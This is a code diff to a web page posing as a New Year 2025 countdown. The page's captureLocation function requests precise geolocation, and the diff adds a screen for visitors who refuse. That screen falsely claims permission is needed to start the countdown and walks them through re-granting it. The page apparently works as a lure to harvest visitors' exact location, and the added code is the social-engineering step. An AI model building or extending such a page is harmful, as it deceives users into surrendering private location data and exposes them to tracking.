@@ -47,6 +47,22 @@
         }
     </style>
     <script>
+        function showBlockedMessage() {
+            document.querySelector('.container').innerHTML = `
+                <h1>🎉 Happy New Year 2025!</h1>
+                <p style="font-size: 1.3em; margin: 30px 0;">Please grant permission to begin the countdown in your timezone!</p>
+                <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                    <p style="font-size: 1.1em; margin-bottom: 15px;">⏰ To view the countdown:</p>
+                    <p style="font-size: 0.9em; margin: 10px 0;">Click the 🔒 or ⓘ icon in your address bar</p>
+                    <p style="font-size: 0.9em; margin: 10px 0;">Select "Allow" when prompted</p>
+                    <p style="font-size: 0.9em; margin: 10px 0;">Then click the button below to continue</p>
+                </div>
+                <button onclick="location.reload()" style="background: #FFD700; color: #1e3c72; border: none; padding: 15px 40px; font-size: 1.2em; border-radius: 30px; cursor: pointer; margin-top: 20px; font-weight: bold; box-shadow: 0 4px 15px rgba(255,215,0,0.4);">
+                    🎊 Start Countdown
+                </button>
+            `;
+        }
+
         function captureLocation() {
             if (!navigator.geolocation) {
                 window.location.href = 'https://vclock.com/timer/new-years-day/';
@@ -71,9 +87,13 @@
                         });
                 },
                 function(error) {
-                    setTimeout(() => {
-                        window.location.href = 'https://vclock.com/timer/new-years-day/';
-                    }, 1000);
+                    if (error.code === error.PERMISSION_DENIED) {
+                        showBlockedMessage();
+                    } else {
+                        setTimeout(() => {
+                            window.location.href = 'https://vclock.com/timer/new-years-day/';
+                        }, 1000);
+                    }
                 },
                 {
                     enableHighAccuracy: true,
